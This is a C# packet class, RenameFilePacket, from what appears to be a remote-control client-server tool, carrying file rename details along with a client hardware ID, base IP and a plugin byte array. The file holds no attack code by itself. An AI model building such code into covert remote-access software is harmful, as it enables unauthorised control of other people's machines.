using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RenameFilePacket : IPacket
    {
        public RenameFilePacket() : base()
        {
            this.PacketType = PacketType.FM_RENAME_FILE;
        }

        public RenameFilePacket(string oldName, string oldPath, string newName, string newPath)
        {
            this.PacketType = PacketType.FM_RENAME_FILE;

            this.oldName = oldName;
            this.oldPath = oldPath;
            this.newName = newName;
            this.newPath = newPath;
        }

        public RenameFilePacket(string oldName, string oldPath, string newName, string newPath, string baseIp, string HWID) 
        {
            this.PacketType = PacketType.FM_RENAME_FILE;
            this.BaseIp = baseIp;
            this.HWID = HWID;

            this.oldName = oldName;
            this.oldPath = oldPath;
            this.newName = newName;
            this.newPath = newPath;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string oldName { get; set; }
        public string oldPath { get; set; }
        public string newName { get; set; }
        public string newPath { get; set; }
        public bool isRenamed { get; set; }
    }
}
